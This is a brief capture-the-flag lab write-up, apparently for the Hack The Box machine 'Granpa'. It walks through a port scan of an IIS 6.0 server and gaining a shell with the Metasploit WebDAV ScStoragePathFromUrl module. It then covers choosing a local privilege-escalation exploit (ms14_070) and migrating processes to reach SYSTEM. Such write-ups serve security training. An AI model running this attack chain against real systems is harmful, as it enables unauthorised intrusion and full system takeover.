1,Recon
port scan
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Fri, 01 Nov 2024 07:27:17 GMT
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

We only get the version of `IIS` is `Microsoft IIS httpd 6.0`
Then we can find something useful from exploit-db
`Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow`

So we can use msf to handle it and exploit it.
```
Executing the Metasploit module iis_webdav_scstoragepathfromurl immediately grants a shell.
The target appears to be Windows Server 2003 with x86 architecture

Computer        : GRANPA
OS              : Windows Server 2003 (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

Running `local_exploit_suggester` in Metasploit returns several recommendations:
```
1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.

```

In this place, `ms14_070_tcpip_ioctl` seems like be a perfect target.

At this point it is a good idea to migrate to a process running under NT AUTHORITY\NETWORK
SERVICE. In this case davcdata.exe seemed to be the only stable process available.
```
migrate 1796
```
Then continue to run the exploit script, then we can get the SYSTEM shell.